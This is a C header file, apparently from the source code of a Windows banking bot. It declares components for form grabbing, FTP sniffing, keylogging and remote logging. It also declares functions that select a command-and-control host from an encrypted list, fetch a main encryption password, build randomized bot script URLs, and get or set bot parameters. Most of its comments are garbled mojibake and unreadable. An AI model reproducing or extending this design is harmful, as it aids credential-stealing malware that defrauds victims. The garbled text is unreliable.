#ifndef ConfigH
#define ConfigH
//----------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"

//********************************************************************
//
//  ���������� ��� DEBUGCONFIG ���� ���������� ���-�� ���
//  ����������� ���������� ���������
//
//********************************************************************



#if !defined(DEBUGCONFIG) && defined(DEBUGBOT)
	#define DEBUGCONFIG
#endif

// ���������, ������ ��������

#define SCRIPT_FORM_GRABBER  1  /* ������ �������� ������ HTML ���� */
#define SCRIPT_TASK          2  /* ������ �������� ����� */
#define SCRIPT_PLUGINS       3  /* ������ �������� �������� */
#define SCRIPT_FTP_SNIFFER   4  /* ������ �������� ������ FTP ��������� */
#define SCRIPT_FIRST_INFO    5  /* ������ �������� ������� � ������� */
#define SCRIPT_GRABBER       6  /* ������ �������� ������������ ������ */
#define SCRIPT_CAB           7  /* ������ �������� ������������ ������ */
#define SCRIPT_HUNTER        8  /* ����� ������� ��������� ������ ������ Hunter */
#define SCRIPT_COMMENT       9  /* ����� ������� ��������� ������ ������ Hunter */
#define SCRIPT_PLUGINS_LIST  10 /* ����� ������� ��������� ���������� � ��������� �������� �� ������� */
#define SCRIPT_KEYLOGGER     11 /* ����� �������, ���� ����� ������������ ������ ��������� */
#define SCRIPT_REMOTE_LOG    12 /* ������ ��������� ����������� */


// ������������ ������� �������� � �������
#define MAX_HOSTS_BUF_SIZE 500 /* ������������ ������ ������ �������� ������ */
#define MAX_PASSWORD_SIZE  100 /* ������ ������ �������� ��������� ������ */
#define MAX_HOST_SIZE      100 /* ������ ������ ��� �������� ����� */
#define MAX_PREFIX_SIZE    20  /* ������ ������ ��� �������� ���� */
#define MAX_DELAY_SIZE     8   /* ����� ��� �������� �������� */


#define DEFAULT_DELAY  10 /* �������� �� ��������� */


//------------------------------------------------------------------
//  GetActiveHost - ������� ���������� ������ ������� ����
//					� ������ ������ ������� ���������� ����� ������
//------------------------------------------------------------------
PCHAR GetActiveHost();
string GetActiveHost2();


//------------------------------------------------------------------
//  GetActiveHostFromBuf - ������� ���������� ���� �� ������
//
//  Hosts - ��������� �� ������������������ ������������� �����
//          ������������� ������ �������. ������� ������ �����
//			������ ����.
//
//  EmptyArrayHash - ��� ���������������� ������ ������ �������.
//                   ������������ ��� �������� ����� ������ �
//  				 ������ ���������
//
//  Encrypted - �������� ����, ��� ������ �����������
//------------------------------------------------------------------
PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash);
string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encrypted);


// ������� ���������� ������ ��� ����������� �����������/������������ ������
PCHAR GetMainPassword(bool NotNULL = false);

//------------------------------------------------------------------------
//  GetBotScriptURL - ������� ���������� ������ ����� ���������� �������
//  ���� ������� Path �� ����� ����������� ���� ����, � ��������� ������
//  ����� �������������� ���� ����������� ��� ������� � ������� Script
//------------------------------------------------------------------------
PCHAR GetBotScriptURL(DWORD Script, PCHAR Path = NULL);


// ������� ���������� ���������� ��� �������
PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD ExtsCount, PCHAR *Exts);

int GetDelay();

char *GetPrefix();


//------------------------------------------------------------------------
//  �������������� ���������� ����
//------------------------------------------------------------------------
#define BOT_PARAM_PREFIX 1   /* ������� ����  */
#define BOT_PARAM_HOSTS  2   /* ����� ���� */
#define BOT_PARAM_KEY    3   /* ���� �� �������� */
#define BOT_PARAM_DELAY  4   /* ����� ������� */



//------------------------------------------------------------------------
//  GetBotParameter - ������� ���������� ������� ����
//
//  ParamID - ������������� ���������
//
//  Buffer - �����, ���� ����� �������� ��������
//
//  BufSize -  ������ ������
//
//  ���������: ������� ������ ���������� ���������� � ����� ����
//			   ���� �������� � �������� ������ NULL �� ������� ������
// 			   ������ ������.
//------------------------------------------------------------------------
DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize);


//------------------------------------------------------------------------
//  SetBotParameter - ������� ������������� �������� ����
//
//  ParamID -  ������������� ��������
//
//  Param - ������ �������������� ���� �� ��������� ���������
//          ���� ��������������� �������� ����� (BOT_PARAM_HOSTS)
//			�� ����������� ����� ������ ������� �������� ���� �� �����
//			������� ��������, ����� ���������� ����� ������ ������ ���
//			������� �������. �.�. ����� ������ ������������� ������
//			�������. ������ ���� ������ ���� ����������.
//			��� �������� ����� ������� ������� ������ ���� ������������
//------------------------------------------------------------------------
BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param);


// � ���������� ������ ������������� ����������� ���������� ���������� ����
#ifdef DEBUGCONFIG
void SetDebugHost(PCHAR Host);
#endif

//----------------------------------------------------------------------------
#endif

